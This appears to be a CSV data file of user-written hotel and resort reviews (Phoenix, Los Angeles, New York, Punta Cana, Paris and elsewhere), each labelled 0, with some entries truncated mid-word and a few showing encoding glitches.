"great family vacation!!! we stayed for 5 days at the hilton squaw peak and had a wonderful time. we got a great internet rate at the resort site that included breakfast for two. the waterpark (at no extra fee) was lots of fun for kids and adults - much better than i had expected. although it was quite crowded on the weekend, it was almost deserted during the week. the suite wasn't posh, but it was nice. the separate living room with pull out sofa bed and additional tv was perfect for our 8 yr old son. we requested a mini-fridge (no additional cost) to stock sodas and snacks. it worked out great. the resort food prices were along the line i've seen at other resorts - not exactly cheap. the staff was very friendly and helpful. we wore the concierge out with requests for directions and recommendations. all were right on the money.i would definitely recommend this resort for a relaxing and fun family vacation!",0
"it was okay... my husband and i stayed here not for the golf but for the spa benefits and great corporate rate they gave us. it was well located, close to malls, highways etc. once we arrived, we were impressed by how well the grounds were kept and how large the complex was. beautiful view from our room of the south mountain. the pool was clean, people who worked there were friendly and professional. however, there were some issues with noise with thin walls between units. also, the room we were in had a patio door facing the main driveway, (we were on the 2nd floor) and the noise from cars and golf carts driving back and forth was a little disturbing, especially around the end of the day. also, the room needed to be refurbished and carpet cleaned. i must also reiterate though that the staff was very happy to help and very accomodating. when we arrived for an early check-in, we were mistakenly given a room that had just been checked out of a few hours prior, so everything was a mess! however, we were offered another room but we said we would wait and we were also given free lunch at the restaurant. not too bad a place, really, even if you don't golf!laura from ontario, canada",0

"pay attention to the details hotel has very modern and comfortable decor. the valet parking is a little steep at $30/day, which they don't seem to disclose anywhere on their site. there's plenty of street parking available. most of the rooms are average size, but request the larger rooms at the end of the hallway on each floor. the hotel offers very few rooms with double bedding, so don't expect to change bedding unless you've pre-reserved the room. each room is equipped with a flat screen, fluffy down blanket and the basic necessities. a complimentary mini bottle of evian is replenshished daily. internet access is available through t-mobile hotspots for a daily fee of $10.all hotel staff is very courteous and attentive especially concierge and bellman. we showed up for our dinner reservation that the concierge helped us with and apparently they booked it for the wrong day. so just make sure you re-confirm everything with concierge. make sure you check your folio upon check out. i pre-paid for the room, but was billed the full room charges again upon check out.located in a great area, with lots of good eats around. extremely easy access to beverly center, melrose and robertson for all those shoppers.",0

"kidsuite was great! on a road trip to hollywood with my 14 12 year old kids (1 boy, 1 girl) we stayed at the beverly garland holiday inn. the staff was very friendly (even returning my phone after i left it at the restaurant and wasn't able to come get it myself until the next morning). the kidsuite was great, though their selection of games dvds is extremely limited (glad we brought our own). it was great to have an empty fridge instead of a mini-bar fridge. only hitch was not fitting on the universal studios shuttle the first day. i wasn't told seating was limited so didn't hurry to get in the front of the line. we didn't fit and i was told no standing and i'd have to wait for the next shuttle. but we needed to be at the park for our vip tour time, so we had to pay for a cab. then on the trip home, the same shuttle driver let 2 guests on without seats (standing).",0

"we stayed in one of the suites - live like a new yorker! we stayed in one of the garden suites, just a few houses down from the main building over the new year, for ten nights and we can highly recommend them!the bathroom was big and clean. the kitchenette was very useful - we couldn't eat out 3 times a day with american size portions so we had breakfast (captain crunch ofcourse!!) before heading out in the morning! the bed was big and comfy and the room was large (something that is not often found in new york apparently!). we had fresh towels daily and the room was cleaned late morning every day.as for location it is perfect! chelsea felt really safe and had a number of restaurants, which were miles better quality than those near times square and other tourist areas (also eat out in grenwich village!) it is a couple of blocks from the subway stations which can then take you everywhere and then when you come back to your suite on the quiet tree lined street its just perfect! as we were going for 10 nights we didn't want to be in the centre of it all as we thought it would get a bit much - and there are sooooo many tourists!! but here we got away from it all at the same time as being only a subway ride away from anywhere in new york!i recommend the chelsea lodge suites to all and would stay there again! it is a fantastic place with my only complaint being that the heating was a little noisy at night which would occasionally wake you, but it was lovely and warm even though flippin' freezing outside!!my tips:1)when arriving from the airport get a yellow cab!! it is the law in ny for the journey from the airport to manhattan to be $45, its about $60 with tolls and tip. the queue looked massive but we zoomed through it. we saw loads of people getting ripped off as they left the airport being approached by private drivers saying the queue would take an hour and a yellow cab would cost them $100 dollars - we can do it cheaper! don't listen, its not true!!! get a yellow cab!!2)if you need a supermarket come out of the chelsae lodge, turn right, go to the end of the block take a left, go down two blocks and on the corner is the cheapest supermarket we found near the chelse lodge (if you want semi-skimmed milk its 2% fat milk)3)use the unlimited subway pass you will save a fortune!!4)there are no safes in the room but we had padlocks on our suitcases and used them to lock up our valuables insteadenjoy the chelsea lodge suites and the rest of new york you will have an amazing time!!",0

"had a great stay. i have just returned from a weeks break at the luxe and thought it was v good. having read the rather mixed reviews here i was a little anxious, however, i was pleasantly surprised by both the hotel and the service. the room was extremely spacious and spotlessly clean. the decor is nice and quite simple and stylish - certainly better than most us hotels i have stayed at in the same price-bracket. the pool area was also very nice.i found that all staff (valets, front-desk staff, housekeeping, room service) were friendly and efficient. i never had to wait long for my car to be brought round and the valets recommended me some great routes to drive in the hills above la. housekeeping staff were also very good and my room appeared to be cleaned about 3 times a day.i did not eat at the hotel restaurant, however, i did order room service for breakfast and snacks. i found the food to be of a decent quality, good portions and also reasonably priced.personally, i thought the location of the hotel was v convenient - particularly with the 405 freeway being so close-by. a few things to note: there is not really anything within walking distance, parking is $22/day, and freeway noise is faintly audible in the room.",0

"beautiful resort this was a wondeful experience. the resort staff was lovely, the rooms were perfect, clean, and spacious. we had a 2 bedroom lock-off. there were two external doors and a connecting door. the 'hotel' side of the lock-off, which i assume can be booked on its on based on the set-up, had a patio, king bed, full bathroom, and a small refrigerator and microwave. the room would be perfect for a solo traveler or a couple. although it had a sitting area that pulled out into a 2nd bed it wouldn't allow any privacy since it was one open room. the '1bedroom' side of the accomodations had a private bedroom area with master bath including a jacuzzi tub. the condo was quite large, had a full kitchen, a pull out sofa bed in the living room, and a patio. the resort is two levels and does not offer elevators. no daily housekeeping or towel changes.the resort grounds were beautifully kept and they offered an 18-hole golf course, shuffle board, and a gorgeous pool with pool bar. the onsite restaurant and bar were fantastic and were adjacent to the pro shop. the resort is fairly close to the airport, but most other adventures require a drive. we did take a day trip to sedona, and the beautifully scenic drive took roughly 2 hours.",0

"great modest hotel for exploring the marais i am actually writing this review from the hotel; so for those seeking internet access in their room and who have a wifi device (laptop or pda) the connection is free and excellent.this is a modest hotel which does what it does, very well. small (to tiny) rooms which are clean and inexpensive (for paris). no view, at least from my room - the airshaft, and not what you would call ambience. but it gives 80% of what you need in a hotel - comfortable bed and clean room with no hassle. the location, on the edge of the marais, is very good if you like the marais and convenient to the republique and temple metro stations for further afield. don't bother with breakfast in the hotel - there are many better and cooler places in a few minutes nice walk.the only real downside i would mention is that the walls are paper thin but it wasn't a problem during my stay, though it could be for others.i will be back again because it is the best value i have found for exploring the marais. try it unless very small rooms or thin walls (and small lifts) are your pet hates. excellent price\quality ratio (for paris) é§?9/night.p.s. i'll up",0

It should close at 1am but we came back and was sat up til 3.30am with the barman - who i should add is lovely. I called him Stellios but im not sure his real name! The staff are really polite and welcoming and made us feel at ease. We never had breakfast so cant comment on that but my friends did and said it was really nice. Fresh bread, cheese etc The Irish pub in the square does a nice fry up if you fancy that. Overall i would stay here again if i was only staying for a few days as it accomo",0

"average punta cana resort, great beach spent a week at the resort in june with my wife and daughter, this was my 3rd time in punta cana, was before at riu bambu and melia caribe, liked both better than this one. positives of grant flamenco: good size: not too big and not too small; landscape almost perfect, very well kept; if you like shopping for souvenirs there is a shopping plaza in a walking distance from hotel, but be aware that sellers are extremely annoying and it is hard to get out from their store until you buy stuff from them. night shows were good, but got a little tired of same performers all week long. nice 1-hour snorkeling place for $20. beach is gorgeous and overweights all negatives. negatives: poor service in restaurants, front desk, and some days in the room. food o-key, you will not go hungry, but do not expect a gourmet delights there, almost the same daily menu. most of a-la-corte restaurants were much worse than we expected except very clean and nice interior and food presentation (not taste). out",0

"great place to stay! we had a completely different experience from the previous reviewer. booked in june after reading trip advisor recommemndations and was not disappointed. we booked a 1 bedroomed apartment, but were given 2 bedrooms when we arrived. the rooms were huge, spotlessly clean and the staff couldn't have been more helpful. yes, the air con was noisy but luckily september isn't a bad month to go and we didn't need it on during the night. the rooms are a bit tired and i think double glazing would be a good idea as it is tdefinitely he city that never sleeps. the fridge was always re-stocked for the following morning and we found it a definite plus not to have to go out for breakfast - much more relaxed and there was always plenty to eat. yes, there was work going on in reception but we never found it a problem as there is a temporary reception on the second floor. we were on the 4th and never heard any noise from the builders. and you couldn't fault the position. we were able to walk to central park, broadway, empire state, etc and the tube was only 1 block away - although found it very confusing! and if you wanted a taxi it only cost 5 dollars to get to times square but to be quite honest it was quicker walking! leave yourself plenty of time to get back to the airport as the traffic is horrendous. may be it was because there was a vip conference on at the waldorff (just around the corner from the hospitality suites) and the roads were blocked off and police presence was huge. it took is 1 1/2 hrs to get to newark!if you can, do the helicopter flight it was amazing and well worth the money. wear comfy shoes as you won't believe how far you walk! loved the shops, especially bloomingdales and china town is definitely worth a visit.",0

Modernity, atmosphere, good food and great rooms and bathrooms all gel to make the stay a happy one. Nice touches include a complimentary breakfast bag to kick start the day, a free Guardian to browse through over breakfast, and a DJ to entertain in the reception/bar area at night. Rooms have ample supplies of tea and coffee and the furnishings and linens are of superior quality. The Restaurant menu is varied and service is efficient.

"ok hilton just to say that overall we enjoyed our stay at the hilton, it was close to universal and the 405 freeway. however there are a few annoying problems we paid to stay on the executive floor and found we were on the floor below which wasn`t a hardship except that the lifts were so slow!! and being a renal transplantee the stair option was not too attractive.the executive lounge facility was far too small especially in the mornings serving the two floors of executive rooms or so we thought....however when you consider the numerous upgrades people seemed to be given from other floors offering access to the lounge it felt like a macdonalds most mornings despite the excellent staff.to appreciate a fantastic executive lounge facility you should visit the hilton arc de triumph in paris - it is amazing!! and all hilton hotels should copy this format, the food and drink available was incredible.the rooms compared to the rest of the hotel were a little dated but were clean and comfortable.my family and i would stay here again for its location and freindly efficient staff.doncaster england",0

welcome luxury a very professional service extended throughout the hotel. we arrived late after a delayed flight and it was a relief to check into such a luxurious room with delightfully comfy beds!breakfast was superb with the waiter actually amending the order for a cheaper option - whilst i still received what i had ordered!the concierge was very helpful and nothing was too much trouble when it came to getting directions and just locating certain shops.,0

"look for another hotel yes, i'm writing this a little late in the game, but being that christmas is coming up, i thought i better warn people. the hilton is lovely to look at (the lobby). however, what everyone else says is true - they nickel and dime you for everything - parking, internet, you name it. sad that such an established hotel must do this. yes, it is close to universal, but so is the sheraton. in fact, if you have a car (most people do in la - even a rental for vacation), stay somewhere else. universal is not that hard to get to from basically anywhere in la. oh, and as for the fancy dining, there was none here. at breakfast (which is not complimentary unless you're one of their members) in their restaurant, they serve a very large buffet. you also have the option of choosing from their menu (super expensive!). when i went to get some raisin bread (which was not covered - a no-no when tons of people are coming through), there were fruit flies on it. as i moved to the fruit section, they were there too! i told the manager that they had this pest problem and she said, oh, sorry about that. because my husband is a fair man, we went back the next morning (to give them another chance) and found the same issue. after having worked in restaurants, i can tell you that this is not just a one time problem. in fact, if this is what the staff allows the public to see, i would be absolutely terrified to see their kitchen! wouldn't be surprised to see them on ramsay's kitchen nightmares soon. there were other issues - my card key for the room didn't work - had to go down to the desk three times. each time they assured me it would work - yeah, right. problems in the room with ventilation - bathroom was freezing - no heat in there. their explanation was that people generally generate enough heat from their hot showers to warm the room. not acceptable. i've stayed at the base of a snow capped mountain that had a heated bathroom. oh, and just fyi - the hotel is a huge place with conference rooms, restaurant, bar, etc. the problem with this is that during the holidays every company under the sun has their christmas party here or there is some huge convention or another celebrating here as well. i was told that this was normal around this time of year. problem? there were so many people in the lobby and the hallways (leading to the restaurant and garage) that we had to push our way through them just to get to the garage! before we checked out, when i asked to speak to the manager about our whole experience, she was always at a meeting, or away from her office. i felt so strongly about speaking to someone in authority, that i left my contact info for the manager to reach me upon checking out. yeah, it's almost a year later and i'm still waiting for that call. i guess the customer is not most important at the hilton. nice. i've actuallly stayed at sheraton universal and they had an outstanding buffet. it was so well maintained and fresh that i asked for the restaurant manager just to compliment him on the fantastic job he and his staff were doing. that was a couple of years ago. perhaps they're still just as good...",0

"Vacation of many new experiences Booked our hotel with GoGo Vacations for the Gran Bahia Principe Punta Cana, but were upgraded to the Ambar. I'm assuming it was due to overbooking as other reviews would have it suggest, but not really quite sure why. We were booked quickly and effeciently and there didn't seem to be a problem. After a long trip I was sad not to have a cocktail at reservations waiting as we have at past all-inclusive resorts, but that was my main check-in complaint. Afterwards we went to reserve 3 Ala Carte restaurant reservations. This took a longer time than it should have. Approximately 25 minutes to book 3 restaurants, Italian, Brazilian BBQ (due to word-of-mouth we never ate at the Brazilian, bad reviews), Le Gourmet. Finally, after a long day of traveling we arrived at our room. It was above our expectations. Lovely corner room in Villa 62, Adults Only section. Very clean, spacious king size bed, corner living area, flat screen tv and large bathroom with separate jacuzzi tub and shower. We stayed mostly at the Adults Section Pool, but managed to travel to the Bavaro Pool. What a difference. Kids were everywhere at the Bavaro pool and it felt a tad clautrophobic. Thank goodness we were upgraded because I think our trip would've been different at the main pool with the sheer amount of families. However, if you want music and more excitement that's your place. The adult pool tends to be a little stuffy. My main complaints about the pool: reserving chairs was tricky. Some of the older guests reserved thiers with towels at midnight. This left people fighting at the crack of dawn to reserve decent chairs with shade. It seemed the older guests were able to keep up with the earlier hours. Only 1 day were we able to secure 4 good chairs with shade and my boyfriend woke at 2:00 am to do it. I think in general reserving to that degree needs to be abstained for overall fairness. It was not uncommon to see people fighting over chairs and arguing because someone reserved thiers but did not use them until 5 hours later. It was sadly humorous. The beach was the best I have ever seen in my tropical travels. We made it a point to walk every day around 4:00. So nice, well kept, lots of people and energy as they are public beaches. You will see a good amount of topless women. Some days a lot more than others. I'd say in general the ratio of patronage was 25% American, 30% Canadian and 40% European. Many french. Most of the staff are tri-lingual in Spanish, French and English. However, do make a point to attempt to speak Spanish, it goes a long way and garners some respect. It's sad to see how many people don't try, but EXPECT everyone to be fluent in English. About the food...mostly wonderful. Large vareity, some gourmet items found daily, caviar, gazpaucho, grilled lobster tails, lovely and surprising appetizer combinations. Lots of fun to try everything. Every palate should be well accomo",0

"perfect for us! my family of four stayed a this wonderful hotel for 5 nights in early june. we loved it, and will definitely think of it first when we travel there in the future. we liked that it felt a bit more like an apartment than a hotel. the location of this property can't be beat. it is near the corner of lexington and 49th (also near the waldorff-astoria, marriott, w, doubletree, and intercontinental). it is close to a subway stop (2 short blocks), m49 and 50 bus routes, restaurants, and grocery stores. nearby landmarks include grand central st, chrysler bldg, rockefeller center, to name a few. taxis are plentiful. the one-bedroom unit was clean and very spacious (especially by nyc standards), and came with a very nicely equipped kitchen. the fridge was stocked regularly and completely with the continental breakfast items (coffee, orange juice, milk, bagels, cream cheese, butter, jelly, and fresh fruit). in fact, the items were almost replenished faster than we could eat them. there were pans, strainer, plates, bowls, glasses, utensils, serving spoons, cutting knives, corkscrew, paper towels, dish detergent, coffee pot/filters, tea/water kettle, and maybe more that i can't remember. a can opener might have been nice. appliances included a dishwasher, stovetop, oven, microwave, fridge, and toaster. we bought groceries from a nearby store and saved much time and money over restaurant meals.the bedroom had a double/full size bed that was comfortable, but the pull-out sofa in the living room, while adequate, had seen better days. the 6th floor unit was actually very quiet...we had a room on the back. we never heard a peep from any of the guests in the other rooms. we didn't really notice much noise from the garage behind the hotel, though the light from it was bright. the windows did have shades, but light can come in around them. eye covers worked fine to fix this. my husband likes the white noise from the window unit air conditioners, but i preferred earplugs. plenty of towels and fairly nice toiletries.the staff was very helpful. check-in and -out was quick and accurate. they had space to store luggage for us on our checkout day. we had a very reasonable aaa rate, that we reserved several months in advance.",0

"like a fabulous trip back in time i thoroughly enjoyed my stay at the biltmore and am almost tempted to give 5 stars, except for a few little niggles.to begin with the good - the ground floors are absolutely gorgeous with a great deal of restored original architecture/decor from the 1920's. my room was only a standard but quite spacious with a very comfortable bed, desk, full closet and comfy chair. my room was on the inside of the building, overlooking a quiet courtyard and i heard virtually no outside noise thanks to the white noise generated by the heat/ac. and the water pressure in the shower was fantastic. the workout equipment in the health club facilities were a little squished and i think i used the oldest still-working elliptical machine in north america. but the treadmills are all pretty new and most machines have a personal flat screen. however, that was completely made up for by the rest of the facilities - the pool, jacuzzi, sauna and spa look original and made me feel like some robber baron in the gilded age.the location is excellent for business in or near downtown and is right in the heart of the financial district. it could also be a good choice for tourists because it is so close to the 101, 110, 5 and 10 freeways, so you can pretty much get anywhere.now for the bad things - all of which are relatively minor and would not stop me from booking here again. first, like many hotels, they charge for internet access, which i find a highly offensive practice. also, valet is $40/night. this is not unusual in la, but should be factored into your budget. the tub/shower had a curtain, rather than a door, which kept sticking to me because it didn't have magnets in the bottom. this was particularly gross since the housekeeping seemed hit or miss - i had 3 great days and 2 eh days. the tv in my room was an old, small crt type and many of the channels buzzed or otherwise had bad reception. finally, when i ordered room service breakfast, my receipt had the wrong name and room number on it. when i asked, the staff person told me you must have written the wrong number on your ticket, this is for you. that was completely unacceptable at this level hotel. even if i actually had made the mistake, i should have received the customer is always right treatment. but, like i said, i would definitely stay here again, it's a great hotel.",0

"Wonderful Hotel We just returned from the Majestic yesterday and thought I would write before time goes by. This was our 7th A.I. resort and we learn new tips each time. My family consists of a 15 year old boy and a 12 year old girl. Here goes:1. Rooms- Beautiful, but do smell a bit musty. No big deal...just bring fresheners. We did not find it a problem with the frosted glass door as the toilet door. WE did request adjoining rooms, but were given rooms next to each other. With a 15 year old boy I wanted to keep a closer eye on him. Went to the front desk and was able to switch the next day...no problem. To address the people that complained that the front desk was not friendly I just want to say it's ALL in the approach. If you go to them demanding things that's what you're going to get anywhere.2.Beach- It was the most beautiful beach we have been to ",0

"lovely hotel wasn't sure what to expect from the sprawling metropolis of la after reading various reviews so i picked a fairly central hotel in downtown. the omni is primarily a business hotel but it was perfect for us road weary road trippers too. beautifully set out with very helpful staff - the concierge was particularly helpful in answering our queries regarding transport attractions. this hotel is in a great location for exploring la, particularly if you don't have a car. as it's in the business district there's not many shops nearby but the underground to all the prime sights is a 5 minute walk away and the area felt a lot safer than much of the city.bedrooms were expansive and comfy with big roomy bathrooms. lots of drinks and sweets available from the mini bar - though at a price too rich for us! morning buffet breakfast (not included in price) was also a treat, fresh made-to-order omlettes and and fuevos rancheros. all in all this felt like a real luxury hotel experience and a great way to finish our california trip.",0

"nearly perfect but!!! stayed in the chelsea lodge for 4 nights and it was extremely close to being the perfect stay.from reading the previous reviews we knew what to expect in terms of room size, toilets sharing etc but these were not an issue.rooms: the rooms, although small, were extremely clean and really had everything one could need. had no problems at all and i am 6'3.toilets: the toilet sharing was not an issue. never had to wait and again the toilets were spotless. there were 3 on each floor so more than enough to go round.location: the location of the lodge is probably the real selling point. we had been to new york twice previously but only on this occasion did we feel we were actually living like a new yorker. it was a fantastic area. safe, buzzing with loads of restaurants and bars. really was fantastic and we ended up coming back to the area on a couple of the nights.staff: helpful without going to win any awards for friendliness. small talk was definitely not the order of the day but they are there 24 hours so no issue.noise: this was where the lodge lost out on the final stars. there is noise from the street but its new york and busy and we had no issue with that. you can hear other guests but again its relatively minimum and doesné¥?? go on for long. the noise issue we had was with the heater in our room. we were in 2g and every morning at 6.30am the heating kicked in and the radiator began to hiss and steam at ridiculous noise level. this went on for 2 hours each morning. we didn't make a deal of it as we were getting up early and the price is good but it was extremely irritating.all in all i would recommend the lodge as it is great value, in an amazing location and very clean. go prepared in terms of the room size and possible noise and you won't have a problem.",0

pleasantly surprised on my first trip to la i felt totally at home in the city and at the hotel. the staff treated me as a familiar friend and went out of their way to help me and make my stay incredible. the hotel was clean and had nice ammenities. the location is also perfect considering that i didn't have a car. all the major bus routes and the metro are just a block away at hollywood blvd. and from there i could get just about everywhere. the neighbourhood is safe and there are always people (or cars!) around. it's a fun area with the hollywood/highland complex just down the street. i would definitely recommend this hotel to a friend.,0

"great location my husband and i were going to see a concert at the american airlines arena, and this was the least expensive place within walking distance. perfect location with free parking and in/out priviledges!! you really can't beat that. after the concert, it was nice to just be able to run across the street to the bayside market, which is right across the street from the hotel.i had actually tried to get a room for both sunday and monday night, but sunday was sold out. at 2am monday morning, we were in town and called the hotel just to see if we could park there (and pretty much sleep in our car) because check-in wasn't until 3pm. the woman at the desk said i could check in to our room without paying for an extra night! at 2am!!! that was a godsend. i couldn't believe how accommodating they were to our situation. besides free parking, food right across the street, a business center and workout room, our room had a refridgerator and effeciency kitchen, iron, and everything we needed to have a comfortable stay. the rooms are clean, although the hallway carpeting is worn and the halls can smell a little stuffy. you can't beat the price and location if you're going to the aa arena or on a cruise.",0
"very good hotel stayed here for 2 nights in may 2005 while on a shopping vacation. the hotel is in a great location, convenient to both beverly hills and santa monica (it is right off of santa monica blvd in century city). obviously, if you are visiting la you need a car and this location is no exception. but it is a short drive from almost any attraction. the rooms are very comfortable, with good bedding. the bathrooms have excellent counter space, enough for three women to get ready at once! good closet space as well, and each room has a balcony. the pool area appeared to be very nice, however, it was too cold to explore fully. do not attempt to self-park! the self-parking signs take you to a garage that is not affiliated with the hotel and has no in and out privileges. service was good. we asked for the air conditioning to be turned on and for extra towels and received both requests immediately. also, they allowed us to check out at 4:00 pm on the day we were leaving, rather than 12:00, with no problem. i would definitely stay here again on my next la trip.",0

"we enjoyed our stay! we stayed here on our way to and from australia. we called for shuttle pickup and it arrived within 10 minutes both times. although the hotel was very busy, we were greeted by very pleasant reception staff. we were upgraded to a suite both times. the suite had a very soft and comfortable king bed and a sofa that turned out into a bed. we requested a rollaway and received one very quickly. my family of four was very comfortable in our spacious room. we loved the view of the airport and watching the planes land and take off. i don't remember noise from the airport but i did hear people walking in the hall and heard voices near the connecting doors in our suite. no big deal though! the hotel has a heated outdoor pool, great fitness center, starbucks (that was open on our return) and a restaurant. the convenience of the hotel to the airport is great! if you have time, you can even take the shuttle back to the airport and have lunch or dinner at the encounter restaurant.",0

"surprisingly nice for price and location the past three or four reviews have a theme that i'm going to echo -- i was delightfully surprised by the design of the remodel. i thought i was in a westin, not a sheraton and i certainly didn't expect that. the only reason i was staying there was because there weren't any rooms at the hotels i usually stayed at (westin or sheraton downtown). the service was great. the lobby glam. the only downside (or upside) is that it's right next to the airport. the planes didn't keep me up at night but i could hear them. if there's a reason that you need to be near lax (or on the west side of 405) this hotel is a good choice.",0

(we were assured the rooms were actually the same.) we were given the key to access the executive lounge however, until i advised the front desk two days into our stay, we were not receiving the turn down service or the daily newspaper we would have received if we had actually been on the executive level which is what my reservation was for.the executive lounge had a nice continental breakfast - cereal, fruit, yogurt, pastries.... the breakfast buffet on the first floor was great too if you wanted things such as eggs, bacon, waffles and the like for breakfast. the buffet also had a wide selection of asian foods as well as other pastries, fruits, cereals and yogurt.in the evening the lounge had appetizers.most evenings we had dinner at the city walk. they have a great selection there and a shuttle will take you to and from the hotel for free. our 16th floor room was nice (although the wallpaper did show a bit of wear) and we had a great view of the 101 freeway, the surrounding hills and universal studios.all in all we had an excellent stay and despite the fact that we weren't actually on the executive level like i had paid for, we had a good time. we will definitely stay here again when we return to la.",0

"Wonderful Hotel, Wonderful Town Unbeknownst the management, the Affinia 50 has ensured my future happiness as a traveler married to an ex-New Yorker.My husband left his native city 30 years ago, vowing never to return to the riots, crime, garbage strikes and other mayhem typical of Manhattan in the '70s. I, on the other hand, had visited the city on my own six years ago and was absolutely smitten with it. Years of repetitive marital suggestions on my part finally wore down my better half's resistance, and he grudgingly agreed to return briefly to the Big Apple with me. I immediatly launched into a frenzy of Internet searching for just the right hotel to make good on my promise that a trip to New York would in no way resemble a holiday in Hades. Late into the night, I pored over TripAdvisor reviews in a growing state of alarm: The most expensive hotels gauranteed a plush experience but were far beyond our budget. Some of the cheapest places sounded positively Dickensian, with levels of filth and discomfort that a midieval peasant would have found unacceptable. Reviews of the Affinia 50 sounded too good to be true: In the heart of Midtown where I wanted to stay, lovely rooms and courteous staff, at a reasonable price. I crossed my fingers and booked.A few weeks later, as our cab crawled through traffic from JFK toward Manhattan, the sight of the Chrysler Building glittering on the horizon wasn't quite enough to keep me from silently planning how we could escape if the Affinia 50 turned out not be as advertised. Could we find another hotel? Stay in New Jersey? Fly home early? Would I ever see my beloved Manhattan again?Well, I needn't have worried. From the stylish exterior (my husband is an architect an we are both fans of modern design, so we liked the stainless-steel awning and towering indoor waterfall in the lobby) to the smiles on the faces of the fedora-clad doormen, we were delighted from the moment we stepped over the threshold. Not only did the hotel have our reservation (another fear of mine), they upgraded us at no charge from a standard room to a junior suite. As we rode up in the elevator, I reminded my husband that rooms on New York are small. In this respect, the Affinia did make a liar of me: our room was immense, with a sitting area, a full small kitchen, a good-sized bathroom, huge closets, and sweeping picture windows across the entire south wall. As we gazed down across a plaza to the famous Smith and Wollensky steakhouse, my husband grinned from ear to ear and said, This is great!Although the building is older, everything in our room was new, appearing to be no more than a couple of years old. Our bed had crisp luxury linens and the most comfortable mattress I have ever had the privilege of sleeping on. The bathroom had ultramodern fixtures (not in the scary, what-is-this-button-for mode, but understated elegance) with Aveda bath products and huge pillowy towels. The office area had a high-speed data connection that we did not use, but we did use the living room with overstuffed chairs, large-screen TV and sofa. We also liked the CD player, popping in discs that we bought on our shopping expeditions through Manhattan's music stores. The Affinia does not have a restaurant, but we did not care as we usually try to eat in as many different places as possible when we travel. There is an absolutely amazing deli called Azure around the corner from the hotel. Several nights, when we had worn our feet down to little stubs walking through museums and galleries, we were content to curl up on our comfy sofa with heaping portions of pad thai and a couple of cold beers from the deli and just watch TV. The hotel also offers continental breakfast for an additional $10 per night, but the deli was so convenient and such good value that we just went there instead. Every morning I got up, got dressed, went out past the cheerful doormen who would tip their fedoras to me, elbowed my way into the streaming throngs of non-tourist New Yorkers, and made for Azure to pick up coffee and pain au chocolate. I would then return to the room, where we sat in the fabulous bed marveling at our good fortune. The only drawback to this routine was that it cut in to sightseeing time, as we got so comfortable we could hardly pry ourselves out of our room. Each morning we would vow to get going before 10:00, but it rarely happened.Late in our stay we discovered that the hotel has wine and cheese available for guests every evening. Again, we did not take advantage of this amenity as we were usually still out sightseeing due to the above-mentioned late start.During our stay, there was only one annoyance, which was not the hotel's fault. The building across the street was being renovated, and some of the work was being done late at night, resulting in pounding and large diesel-engine-idling noises, rather like those of a garbage truck. I think this sort of thing is nearly unvoidable in Manhattan, so I would encourage anyone who does not travel with earplugs to do so. We heard no other street noises from our sixth-floor room nor did we hear any sound from any other rooms.The Affinia's location is one of its major advantages. If you're reasonably energetic, you can easily walk to Fifth Avenue, Rockefeller Center, the south end of Central Park, and Grand Central Station. There are also several subway entrances near the hotel. There are too many restaurants in the neighborhood to list, but fans of Irish pubs as my husband and I are will find the number of these establishments within a few blocks to be nothing short of overwhelming. We also had an outstanding and thoroughly real New York experience dining at Smith and Wollensky, made all the more pleasant by being able to walk across the street to the restaurant.The Affinia's neighborhood is quite safe, and I would have had no concern whatsover about walking around alone at night.My only complaint about the hotel was that we were unable to extend our stay, as they were thoroughly booked. The staff made immense efforts to accommo",0

"good for short stays or business i stayed here for four days and three nights on a business trip. when i first arrived i was given a room next to the elevator on the 2nd floor. when i made the reservations it was for a fourth floor room by the pool. when i realized where my room was i went back down the desk and requested a new room. that request was granted however still on the 2nd floor. however, the room was wonderful. i had no complaints about the room or the service at all. the entire hotel stall was wonderful and very accomodating. our meetings were held at the hotel also and they were very nicely handled and the food we were served was wonderul also. the hotel was completely booked the entire time that our party but you would have never known it. the pool was relaxing and well maintained. they would even leave the pool open later then normal since most of the guests were in meetings and dinner parties so when we got back to relax it was nice that we could have some pool time. the breakfasts were wonderful and the cook was funny and a great start for the day. the cocktain reception was fun and a great place to meet the other guests that were there. the room was kept clean and like i said before there were no complaints. however if you are wanting to walk at all around the outside of the hotel area i wouldnt recommend it, as well at the staff not recommending it. its not a great area of phx to be out alone walking, even in the daytime as far as i was concerned. however i did it one time in the daytime but was scared. you can hear other guests shower and toilet going when they were being used so that was noisey. but that's in most hotels i guess. for a one night stay it would be great, however for extended stay and something super special you should stay somewhere else perhaps. other then that i have nothing really bad to say.",0

"Chic Hotel Expensive with a little twist to it. This hotel is run by hotel and catering students with supervision of course. With that comes some drawbacks as the service received for paying quite a lot does not addup. However, because it is run by students, they tend to be careful and ever so obliging. We did not have any problems whatsoever.The hotel itself is quite understated. It is located quite close to the city centre and the tram stop is only opposite the hotel. Gettingaround was not difficult as Amsterdam is a walkable city. The hotel itself is difficult to locate if you have to find it yourself as there are no big signs. It was an old school but totally refurbished so it looks very up-to-",0

"a really top class resort stayed here just one night for a quick spa break with a girlfriend. the sales representative on the phone convinced me with her attitude and friendliness that this would be a good place for me and my friend, who was going through a tough time emotionally.it offers a great luxury alternative to big chain spa hotels. it is in a beautiful, historic setting that creates a much more intimate ambience. i would go back with my husband for a romantic weekend, definitely.it was beautiful, relaxing, and the service was excellent. our room was huge, and although it overlooked the parking lot, still had a nice view, and was extremely comfortable. the beds were great, the bathtub was the size of a swimming pool.the grounds are absolutely lovely, and worth strolling round. the staff are really wonderful. everyone knew our names, and made sure they pronounced them properly.the restaurant was excellent, food, service, value for money (surprisingly reasonable, considering it is very highly rated).the spa is a little small for the size of the hotel. as it was very cold during our stay, we couldn't enjoy all the outdoor areas. if it had been warmer we would have probably spent longer there. the indoor relaxation areas are very small, and only two showers, which seems a little odd.only quibble with the room: poor lighting in the bathroom makes it hard for us middle-aged women to put on make-up!",0

the most exciting place on earth i just want to say that this has got to be the best place i have ever stayed at. the first thing to greet us at the front desk was a poster of the live wild west show they had going on on friday nights. we went to see that and we laughed our pants off. it was more entertaining than some of the shows we have seen in vegas. it was definatly aimed at the kids but you couldn't miss the double entrandes and site gags and pratfalls. also the staff at the river ranch was excellent. brian our bartender was very informative about the local surroundings and kept us entertained the entire day. we enjoyed the rooms immensley. they were large enough to accomodate everyone in the whole family. the coyote camp they have on site is a blessing in disguise. it is a place where you can drop off the kids for a day and not have to worry. my wife and i could not have been more pleased. we are going to come back to this resort every chance we get. hopefully the show will be even funnier next year. keep up the good work guys!!!!!!!!!,0

